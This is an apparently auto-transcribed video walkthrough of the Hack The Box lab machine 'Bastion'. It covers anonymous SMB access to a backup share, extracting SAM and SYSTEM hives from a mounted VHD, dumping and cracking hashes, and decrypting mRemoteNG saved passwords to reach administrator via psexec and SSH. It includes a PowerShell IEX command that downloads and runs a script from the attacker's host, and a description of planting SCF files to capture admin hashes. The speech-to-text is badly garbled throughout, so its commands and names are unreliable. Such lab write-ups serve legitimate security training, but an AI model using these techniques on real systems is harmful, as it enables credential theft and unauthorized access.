 what's going on YouTube this is a hip sack and we don't bash them from hack the box which is set up like a bastion host some people call them jump boxes essentially the idea is you create one super secure box that's absolutely hacker-proof for all your users to remote into in order to access things on the other side so let's say I'm at home and I want to access things on the corporate network instead of leaving my corporate Windows workstation exposed to the Internet I'd just leave a bastion host exposed and then from home I can SSH into the bastion host which is dual homed and I can then create a port forward to access my workstation that's essentially the idea the main drawback is a bastion host by definition is one host so if that host ever gets compromised all the credentials that access it also get compromised which often is domain admins and they normally can get into a lot of things that technology has kind of been replaced by the web browser because you can do almost anything in the web browser especially with no VNC guacamole etc you can just create virtual environments that contain users choose specific places and don't give them a whole environment so you're not sharing credentials if you don't want to do that you got things like virtual application streaming so you can just stream them the app they need and then if you want to go even more you can do like a Remote Desktop gateway so when they remote desktop in they get their own environment so again if that environment ever gets compromised it commbuys is just their credentials it's not sharing a host for everyone so with all that being said let's go exploit a bastion host as always we begin with a and maps are - SC for default scripts SV enumerate versions hue output all formats pin the end map director and call it bash 10 and then the IP address which is 10 10 10 134 can take some come to run so I've already ran it look at the results we have a few ports open the first thing is SSH on 422 and that's running OpenSSH for windows SSH on Windows is a bit unique but hey it's there so definitely take note of it then we have a procedural call on ports 135 and 139 nothing too interesting there then this mics off - des which is SMB on point for four or five and interesting enough there's no web servers so I believe the biggest attack surface right now is SMB so that's where we can begin SSH generally has authentication and I've never seen like guest access to SSH or anonymous access but I have seen anonymous access to SMB so let's go and try that out first thing I'm going to do is SMB client - Capra l - where shares then slash slash ten ten ten one thirty four and then for the past four I'm just gonna hit enter and it will list the shares the admin C and IP C are all defaults backups is a unique share so I'm going to mount backups with mount - t CIFS which is the like Windows protocol for mounting I think SMB FS may work as well I honestly don't know the difference between CIFS and SMB FS but back to the point but the mount point which is ten ten ten one thirty four slash backups and then where do you want to mount it to so I'm gonna make the directory /mnt slash SMB and then we'll mount it there and then password just hit nothing for a guest authentication and if we do LS / mount SMB we see files there's also SMB map which we could use if you don't want to use SMB client so that'd be SMB map - capital H ten ten ten one thirty four and the first thing it does I believe is like anonymous access which we get denied if you specify any user name it doesn't matter which one it will try guest access and we can see files the interesting thing to note though is I believe it attempted to write this directory so let's do LS / mount / SMB and we see that directory exists because it says the permissions are readwrite so it tests to write but it doesn't have mission to delete so always keep in mind what your tools do and if your defender also know what tools do because you can create IO cs4 indicators of compromise but if we try to remove this we get access to nine and we can verify that it does indeed create a random file by just drawing that same command again and if we do LS la mount SMB will see the second file it attempted to create so if I was creating some type of IRC for this I just like monitor shared drives and the root directory for things that are let's see probably 10 characters long so that couldn't help detect SMB map usage on your network but it's also a reason why sometimes I prefer just using like the dumb tools like SMB client instead of automated things because typically those don't make mistakes like that and that may not be a mistake but always know what your tools do so let's just get back on topic and go through this we have no dot txt so I'm going to see what that file is if we cat it out it says sis admins please don't transfer the entire backup locally while on a VPN or office is just too slow for that so if we do like a D u - H s to see the size and then let's just go into that directory oh it's 5.1 gigs so they don't want you copying five gigs over the network that's fair so let's just go through this we got the Machine name ll4 m pj e - PE i've got pc if we go do it nmap scans that will probably say it here NetBIOS computer name is Bastion so a little bit different we got a backup of this PC but the computer name and add map at least is bashed in so let's keep going through this we do have a backup so let's check this l LS la and there are a few files so right here the interesting files are probably gonna be v HD virtual drive and there's two options we could do we can do like 7zl to list files and 7-zip has the ability to go and view the files of a VHD file so we can see this and we can see all the paths given that it's only got system boot that is probably the boot partition that's backed up so let's go to the next one down and this will be FBC for this one is FPC 3 so it's just a guin but let's try the other petition and this one is probably much bigger if we do DHS stir this one one is the 5j petition you can do 7-zip here as well and then you could do like 7z space X to extract it but typically it's just a pain working with 7-zip and this can be a little bit slow so I'm gonna pause the video will let this view all the files and then we're just gonna mount the VHD soon zip has finished and we can look at all the files it shows and it shows us pretty much a Windows install but there's just so many files to go through and search it's a pain so let's mount this did you mount a VHD on linux use guest mail and I don't have that installed so I'm gonna do app to install Lib guest FS - tools and install this well that installs there is one thing I missed that I probably would do if I was on an engagement if we did SMB map - you does not exist and then - H 10 10 10 134 if I saw this readwrite on like backups or pretty much readwrite anywhere I probably create a dot SCF file if you have unfamiliar with that we showed it in sizzle essentially it's a method to do steal hashes so when a user views a directory that has that SCF file if the SCF file is specifically created you can force them to try to connect it back to your machine and when they do so they may perform an authentication if they perform an authentication get the hash crack it so being on the back abstractor in particular is super useful because the people who view backups are probably admins so if you put an SCF file there and an admin goes you may get an admin hash so definitely check out the sizzle video for that it's not gonna work on this box because there's no automated process looking at that directory but I was hoping the tool would finish by the time I explained that it didn't so I'm gonna pause the video again and we'll just resume when this is done once Lib guest FS tools is done we can mount the drive so we'll do guest mount and then - - ad specify the VHD file do - - inspector - - read-only and you could do - beef of a bose just to make sure it's doing something oh we had specify a directory so let's do make to mount a VHD and we'll mount it there so it's going to take probably a minute to two minutes to mount and just spew a bunch of stuff to tech the screen so we'll just let that mount and resume the video when this is done when the command finishes you'll be back at a command prompt so now we can go into slash mount VHD where we mounted it and doing LS here shows we're at the C Drive so the very first thing I'm going to do is go into the users do an LS and we got the l4m pje user and we can look at what files are here so we can do like find desktop documents downloads and then do like - LS to list all the files and we see really nothing too interesting so one thing we could try to do is extract maybe the administrator password to this guy so if we go into Windows then system32 and then config we have a few files important ones are I believe Sam and system and these are the registry hives if you like H key local machine whatnot I think the user database is in the Sam but the boot key which the user database is encrypted is in the system so that's why you need that one and if you're only the main control you'd also want to grab like NTDs did and if you have all three files NTDs Sam and system you can extract the Active Directory database but for now we're just on the box so we'll do that root H GB boxes and then bash them so let's go into that directory and we can make a directory backup doll and move those files there go in here and we can do I think it's secrets dump or in packet - secrets dump - Sam the file name system the file name and then local and here we go we have a few hashes the first thing I notice is the administrator hash is blank 31 d6 means nothing same with aad 3 B as a LM hash LM is it used a more so that's why you see it always blanked out but this being blanked out means administrator account is probably disabled so we do have a hash for a user and we can check if he has write access over the sieve all or C dollar sign if he does then we can probably use PS exec and get administrator if he doesn't then want to find another way so I'm doing - H - test as a hash flow again and this does pass the hash so a paste the whole hash in and then - capital H is the host name 10 10 10 134 maybe it's just - P and that uses some regular expression there we go hash to tack so we see we authenticated but the admin has no access si has no access backup still has the same so we didn't get anything there was that SSH login so let's try to decrypt this hash and see if we can log in via SSH so I'm just gonna go to hashes org we can do hash search and then search hashes org for this so ki 2 D 9 u 0 and we see the password is something so V dot creds l 4m p je i think is the username what did I use here l4m pje yep so we got a password so let's try ssh l 4m p je @ 10 10 10 134 to see if they allow SSH to log in yes ok creds copy this paste and there we go we are now on the box so the first thing I'm gonna do is net local group administrator administrators and we see the members of the administrators group is administrator which is odd because it looked like this account was disabled so we can do net local group or not net local group net user l 4m p je to see what groups were a member of I believe it says there we go local group membership users so let's check net user administrator and we can see he has logged on he does have a password last set date of April 16th so what I'm going to do is go back into the VHD and we're going to see the dates of those files so LS la and we can see grab Sam the Sam was last modified February 22nd and the system was modified February 22nd as well the password was updated in April so this is an old backup and that's why the administrator account was blank now but now it definitely looks like there is one so we have to figure out how to reverse things I'm gonna do is run a tool called jaws and just another Windows enumeration script that's on PowerShell so we'll get hub to find it and install it I had installed Kali again so I don't have all my tools we can't opt you can see it's rather bare so go into drawers we can do python m simple HTTP server and then look at our IP address which is probably ten ten fourteen three it is so we can do powershell and then IX new object net web client download string HTTP ten ten fourteen three four eight thousand jaws a new mess one I think that's the name of the script there we go now it's running well that runs let's just see if we can get another session to this box because it can take a while and you should always be doing recon in the background and working while you do recon it's getting a lot of permission denied but we don't care about that right now we are enumerated box so going to go into the root of C actually let's just check users we got the administrator user and l4 m p je we didn't have a flag I think and the desktop of the background of the background back up so let's check if we have a flag here so l4m pje CD desktop dir you got user text there says it's 32 bytes so chances are that is the flag let's look at what is in documents nothing you can check all the directories I don't think you'll find anything so let's go to the root of C and see what's here we got backups for you look in backups this is the share so nothing too interesting there you got logs looking in quite a few of that logs and things but I'm going to ignore these because look at the date September 12 2016 wasn't it like February something and recent so chances are these logs are old so I could care less about them because we know the administrator change his password after then at least I think it was 2018 let's check net users administrator yeah that'll last at 2019 so looking at file dates is generally a good thing to do so I'm gonna go into Program Files do I dir and see what's here we have the OpenSSH directory powershell nothing too interesting we can check Program Files x86 dir and there's an application that looks unique M remote ng and this is just a like I think it's imagine a tool that manages a bunch of putties it's just a remote desktop management tool or something I've used it before a long time ago don't exactly remember but going on the theme of bashed in it's a remote management tool and generally people use Bastion host as a jump box and you load remote management tools on it so they can access other equipment Bastien doesn't really serve any purpose other than getting into other places so let's go and google em remote ng extract password so we got this view M remote passwords M remote password recover so let's see is there anything here recover easy I don't want to download something off some guys Dropbox account so let's do instead of extract password decrypt password and going down we get a blog post that says M remote ng password is insecure and then links to this post and if we go over it we can see there is a specific version of something where it's saying you can reverse the encryption this blog post has something different and installs M remote ng and here you go you can see the connection this is saying Remote Desktop so it's going to open up Remote Desktop and probably put the password on your clipboard so you can paste it in so what they did is they say hey instead of opening remote desktop which is M stsc open up CMD and then echo me the password variable which is what I would put in your clipboard or paste in or whatnot we're going to do this box a little bit differently because I don't want to load up windows I'm going to do a offline decoder so I'm just going to search github M remote ng decrypt and we'll go to the first one and use this guys Python script so let's go back to this pane we can stop posting jaws I guess and do get clone Emmert ng decrypt and yes I know that I already have not wanted to download a Dropbox thing and then immediately get cloning something from github and just executing without reading the source irony's not lost on me there but we can look at this and it needs this string of the password so that's what we have to find we have to find the string of the password and if you read the blog post it's in the config file so generally in Windows config files for users or stored an app data which is in the user directory so CD / users l4m pje I think dir slash a will list all files including hidden so that's where you can see app data if you don't have the slash a you don't see it but we go into app data and then normally it's in roaming and we can go em remote and G dir and here we go we got a bunch of configs with some backups so I'm just gonna do type to cat the file there's the XML I'm going to search for password so username l4m pje here's this password and let's try decrypting it so we'll do Python 3mm remote ng string paste this this credential looks similar we already had that so let's go see if there's another one that's just my bad search for password hit and to do next and just keep going up until we see something interesting and right here I see a different base 64 string this use name is administrator so let's copy this and do the same exact thing so python 3 - s paste and then we get a different password so i'm going to do SMB matt - you administrator - p for password - h for host 10 10 10 134 and we see now we can read and write to admin a see dollar sign so we should be able to do like in packet - PS exact do I don't have that impact it I guess I don't have it installed locate PS exec PI user share is it here not on my path use a shared dock pass on - and packet we could also just SSH in but I wanted to use in packet so PS exact up PI okay administrator at 10 10 10 134 paste the password request in the shares uploading the file and as long as antivirus or something doesn't stop this we should get a shell well that goes we can just SSH administrator at 10 10 10 134 and now we're rushing to who get the shell first PS exact or my SSH session come on let's go down ping 10 10 10 134 nope just going slow paste it in can only imagine would be like downloading that 5 gigabyte file come on eventually something will let me in as that PS exact or this SSH there we go so Who am I administrator at Bastion Desktop dir root dot txt and then we can also CD users administrator desktop and we see root texts it should be important to note that willing to do PS exact we're running a system when I do SSH we're running as the administrator user just something to keep note of if you use the I think Windows version of PS exact you can use remain as the user I don't think there's a flag in in packets to not impersonate or yeah not impersonate the user so let's see maybe there's a help if there is we can see if there's not impersonate don't see it so yep but that'll be the video hope you guys enjoyed it take care and I will see you all next week